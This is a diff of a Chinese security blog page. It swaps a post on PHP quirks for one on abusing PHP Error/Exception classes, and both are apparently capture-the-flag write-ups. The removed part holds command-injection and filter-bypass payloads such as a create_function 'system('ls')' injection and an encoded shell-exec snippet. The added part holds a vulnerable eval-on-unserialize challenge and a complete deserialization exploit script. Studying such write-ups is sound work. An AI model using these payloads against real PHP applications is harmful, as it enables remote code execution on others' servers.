@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="php特性, Keep-Boom">
+    <meta name="keywords" content="php错误类的利用, Keep-Boom">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>php特性 | Keep-Boom</title>
+    <title>php错误类的利用 | Keep-Boom</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/14.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/2.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">php特性</h1>
+                    <h1 class="description center-align post-title">php错误类的利用</h1>
                 </div>
             </div>
         </div>
@@ -443,7 +443,7 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2021-05-25
+                    2021-07-29
                 </div>
                 
 
@@ -459,75 +459,60 @@
         <hr class="clearfix">
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h5 id="basename"><a href="#basename" class="headerlink" title="basename"></a><strong>basename</strong></h5><pre><code>$path=&#39;/source/index.php&#39;;
-var_dump(basename($path));
-=&gt;index.php
+                <h5 id="PHP原生类中的两个类"><a href="#PHP原生类中的两个类" class="headerlink" title="PHP原生类中的两个类"></a>PHP原生类中的两个类</h5><p><strong>Error</strong></p>
+<p>(PHP 7, PHP 8)</p>
+<p>是所有PHP内部错误类的基类。</p>
+<p><strong>Exception</strong></p>
+<p>(PHP 5, PHP 7, PHP 8)</p>
+<p>是所有异常的基类。</p>
+<p>二者都存在<code>__toString</code>方法。当类被当作字符串处理的时候就会触发该方法。</p>
+<p>看看被当成字符串时会输出啥？</p>
+<p><img src="D:\boke\blog\source\images\124.png"></p>
+<p>发现会以字符串的形式输出当前报错，包含当前的错误信息（payload）以及当前报错的行号（2），而传入 Error(“payload”,1) 中的错误代码“1”则没有输出出来。</p>
+<h5 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h5><p>source</p>
+<pre><code> &lt;?php
+error_reporting(0);
+class SYCLOVER &#123;
+    public $syc;
+    public $lover;
 
-$path=&#39;/source/index.php/&#39;.urldecode(%99);
-var_dump(basename($path));
-=&gt;index.php
-basename这个函数会去掉文件名开头的非ASCII值</code></pre>
-<h5 id="create-fucntion"><a href="#create-fucntion" class="headerlink" title="create_fucntion"></a><strong>create_fucntion</strong></h5><pre><code>create_function(&#39;$a,$b&#39;,&#39;return $a+$b&#39;)
-想当于
-function lambda1(a,b)&#123;
-rerutn a+b;
+    public function __wakeup()&#123;
+        if( ($this-&gt;syc != $this-&gt;lover) &amp;&amp; (md5($this-&gt;syc) === md5($this-&gt;lover)) &amp;&amp; (sha1($this-&gt;syc)=== sha1($this-&gt;lover)) )&#123;
+           if(!preg_match(&quot;/\&lt;\?php|\(|\)|\&quot;|\&#39;/&quot;, $this-&gt;syc, $match))&#123;
+               eval($this-&gt;syc);
+           &#125; else &#123;
+               die(&quot;Try Hard !!&quot;);
+           &#125;
+
+        &#125;
+    &#125;
 &#125;
 
-利用
-$a = $_GET[&#39;a&#39;];
-create_function(&#39;&#39;,$a);
-
-payload:
-?a=&#125;echo system(&#39;ls&#39;);//</code></pre>
-<h5 id="ereg"><a href="#ereg" class="headerlink" title="ereg"></a><strong>ereg</strong></h5><pre><code>可以用%00绕过匹配
-
-if (ereg (&quot;^[a-zA-Z]+$&quot;, $_GET[&#39;c&#39;])===FALSE)  &#123;
-    die(&#39;error&#39;);
-
-&#125;
-//只有36d的人才能看到flag
-if(intval(strrev($_GET[&#39;c&#39;]))==0x36d)&#123;
-    echo $flag;
+if (isset($_GET[&#39;great&#39;]))&#123;
+    unserialize($_GET[&#39;great&#39;]);
+&#125; else &#123;
+    highlight_file(__FILE__);
 &#125;
 
-payload
-?c=a%00778</code></pre>
-<h5 id="intval"><a href="#intval" class="headerlink" title="intval"></a><strong>intval</strong></h5><pre><code>如果 base 是 0，通过检测 var 的格式来决定使用的进制：
-如果字符串包括了 &quot;0x&quot; (或 &quot;0X&quot;) 的前缀，使用 16 进制 (hex)；否则，
-如果字符串以 &quot;0&quot; 开始，使用 8 进制(octal)；否则，
-将使用 10 进制 (decimal)。
-intval(&#39;4476.0&#39;)===4476    小数点  
-intval(&#39;+4476.0&#39;)===4476   正负号
-intval(&#39;4476e0&#39;)===4476    科学计数法
-intval(&#39;0x117c&#39;)===4476    16进制
-intval(&#39;010574&#39;)===4476    8进制
-intval(&#39; 010574&#39;)===4476   8进制+空格
-intval无法处理数组</code></pre>
-<pre><code>&lt;?=`cat *`;
-base64 &lt;==&gt;PD89YGNhdCAqYDs
-hex2bin &lt;==&gt;5044383959474e6864434171594473</code></pre>
-<h5 id="preg-replace"><a href="#preg-replace" class="headerlink" title="preg_replace"></a><strong>preg_replace</strong></h5><pre><code>在/e模式下，会把替换成的参数当作PHP代码执行。
-/e模式在PHP7已经被删除
-
-\\1表示匹配子查询的第一个内容 \\2则表示第二个
-?\S*=$&#123;phpinfo()&#125;
-$&#123;&#125;会把里面的代码当作变量执行</code></pre>
-<h5 id="switch"><a href="#switch" class="headerlink" title="switch"></a><strong>switch</strong></h5><pre><code>var_dump(highlight_file(__FILE__));
-=&gt;bool(true)
-
-$a = highlight_file(__FILE__);
-witch($a)&#123;
-    case &quot;upload&quot;:
-        echo 1;
-        break;
-    case &quot;download&quot;:
-        echo 2;
-        break;
+?&gt;</code></pre>
+<ul>
+<li>第一眼看到<code>md5</code>和<code>sha1</code>会想到利用数组绕过，但是数组在eval中却是执行不了的。</li>
+<li>因为<code>Error(&quot;payload&quot;,1)</code>和<code>Error(&quot;payload&quot;,2)</code>本身是不一样的但作为字符串的时候输出是一样的。所以可以利用<code>Error</code>和<code>Exception</code>类进行绕过。</li>
+<li>过滤了<code>&#39;</code>，<code>&quot;</code>，<code>()</code>这里可以利用取反来进行绕过。</li>
+</ul>
+<h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><pre><code>&lt;?php
+class SYCLOVER &#123;
+    public $syc;
+    public $lover;
 &#125;
-=&gt; 1;</code></pre>
-<h5 id="mb-strtolower"><a href="#mb-strtolower" class="headerlink" title="mb_strtolower"></a>mb_strtolower</h5><pre><code>%c4%b0 urldecode=&gt; İ
-var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
-=&gt;True</code></pre>
+$str = &quot;?&gt;&lt;?=include~&quot;.urldecode(&quot;%D0%99%93%9E%98&quot;).&quot;?&gt;&quot;;
+$a=new Error($str,1);
+$b=new Error($str,2);
+$c = new SYCLOVER();
+$c-&gt;syc = $a;
+$c-&gt;lover = $b;
+echo(urlencode(serialize($c)));
+?&gt;</code></pre>
 
             </div>
             <hr/>
@@ -553,7 +538,7 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://example.com/2021/05/25/php%E7%89%B9%E6%80%A7/">http://example.com/2021/05/25/php%E7%89%B9%E6%80%A7/</a>
+                    <a href="http://example.com/2021/07/29/php%E9%94%99%E8%AF%AF%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">http://example.com/2021/07/29/php%E9%94%99%E8%AF%AF%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -758,54 +743,18 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2021/05/27/cve-2018-12613-PhpMyadmin%E5%90%8E%E5%8F%B0%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB/">
+                <a href="/2021/07/29/php%E9%94%99%E8%AF%AF%E7%B1%BB%E7%9A%84%E5%88%A9%E7%94%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/11.jpg" class="responsive-img" alt="cve-2018-12613-PhpMyadmin后台文件包含">
+                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="php错误类的利用">
                         
-                        <span class="card-title">cve-2018-12613-PhpMyadmin后台文件包含</span>
-                    </div>
-                </a>
-                <div class="card-content article-content">
-                    <div class="summary block-with-text">
-                        
-                            
-                        
-                    </div>
-                    <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2021-05-27
-                        </span>
-                        <span class="publish-author">
-                            
-                            <i class="fas fa-user fa-fw"></i>
-                            Chan.Joy
-                            
-                        </span>
-                    </div>
-                </div>
-                
-            </div>
-        </div>
-        
-        
-        <div class="article col s12 m6" data-aos="fade-up">
-            <div class="article-badge right-badge text-color">
-                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
-            </div>
-            <div class="card">
-                <a href="/2021/05/24/php%E7%BC%96%E7%A0%81Rce/">
-                    <div class="card-image">
-                        
-                        
-                        <img src="/medias/featureimages/23.jpg" class="responsive-img" alt="php编码Rce">
-                        
-                        <span class="card-title">php编码Rce</span>
+                        <span class="card-title">php错误类的利用</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -816,7 +765,45 @@ var_dump(mb_strtolower(&#39;İ&#39;)===&#39;i&#39;);
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2021-05-24
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-29
+                            </span>
+                        <span class="publish-author">
+                            
+                            <i class="fas fa-user fa-fw"></i>
+                            Chan.Joy
+                            
+                        </span>
+                    </div>
+                </div>
+
+                
+            </div>
+        </div>
+        
+        
+        <div class="article col s12 m6" data-aos="fade-up">
+            <div class="article-badge right-badge text-color">
+                下一篇&nbsp;<i class="fas fa-chevron-right"></i>
+            </div>
+            <div class="card">
+                <a href="/2021/07/26/ECB%E5%8A%A0%E5%AF%86/">
+                    <div class="card-image">
+                        
+                        
+                        <img src="/medias/featureimages/10.jpg" class="responsive-img" alt="ECB加密">
+                        
+                        <span class="card-title">ECB加密</span>
+                    </div>
+                </a>
+                <div class="card-content article-content">
+                    <div class="summary block-with-text">
+                        
+                            
+                        
+                    </div>
+                    <div class="publish-info">
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2021-07-26
                             </span>
                         <span class="publish-author">
                             
